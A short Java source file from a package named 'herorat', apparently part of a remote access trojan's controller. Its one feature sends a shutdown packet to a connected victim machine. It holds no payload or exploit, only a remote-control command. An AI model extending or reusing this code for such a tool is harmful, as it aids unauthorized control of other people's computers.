package net.herorat.features.shutdown;

import net.herorat.features.servers.Server;
import net.herorat.network.Packet;
import net.herorat.network.Packet13Shutdown;


public class Shutdown
{
	public static void send(Server server)
	{
		Packet p = new Packet13Shutdown(server.outputstream, new String[] { });
		p.write();
	}

	public static void handle(Server server, String[] args)
	{
	}
}